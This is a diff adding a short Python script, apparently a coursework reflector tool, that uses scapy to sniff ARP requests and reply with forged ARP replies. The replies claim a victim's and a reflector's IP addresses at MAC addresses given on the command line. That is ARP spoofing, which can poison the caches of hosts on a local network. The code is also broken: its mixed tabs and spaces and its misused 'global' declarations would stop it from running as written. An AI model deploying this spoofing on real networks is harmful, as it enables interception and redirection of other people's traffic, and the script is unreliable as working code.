@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+
+import sys
+import logging
+from scapy.all import *
+
+global v_ref
+global reflector_ip
+global reflector_macaddr
+global victim_ip
+global victim_macaddr
+
+#extract each argument from the command line
+def capture_arg(arguments):
+
+	for index in range(1,len(arguments)):
+		if(arguments[index] == '--interface'):
+			v_ref = sys.argv[index+1]
+		if (arguments[index] == '--victim-ip'):
+			victim_ip = sys.argv[index+1]
+		if (arguments[index] == '--victim-ethernet'):
+			victim_macaddr = sys.argv[index+1]
+		if (arguments[index] == '--reflector-ip'):
+			reflector_ip = sys.argv[index+1]
+		if (arguments[index] == '--reflector-ethernet'):
+			reflector_macaddr = sys.argv[index+1]
+
+	print (v_ref)
+	print (victim_ip)
+	print (victim_macaddr)
+	print (reflector_ip) 
+	print (reflector_macaddr)
+	
+def sniffpacket():
+	sniff(count=0,prn=callback_sniffpacket)
+
+def callback_sniffpacket(packet):
+	if ARP in packet and packet[ARP].op == 1:
+		arp_victim = ARP()
+		arp_victim.op = 2
+		arp_victim.psrc = victim_ip
+		arp_victim.hwsrc = victim_macaddr
+		arp_victim.pdst = packet[ARP].psrc
+		arp_victim.hwdst = packet[ARP].hwsrc
+		
+		arp_victim.show()
+		send(arp_victim)
+		
+		arp_reflector = ARP()
+                arp_reflector.op = 2
+                arp_reflector.psrc = reflector_ip
+                arp_reflector.hwsrc = reflector_macaddr
+                arp_reflector.pdst = packet[ARP].psrc
+                arp_reflector.hwdst = packet[ARP].hwsrc
+
+                arp_reflector.show()
+                send(arp_reflector)
+
+
+	
+if __name__== "__main__":
+	capture_arg(sys.argv)
+        sniffpacket()
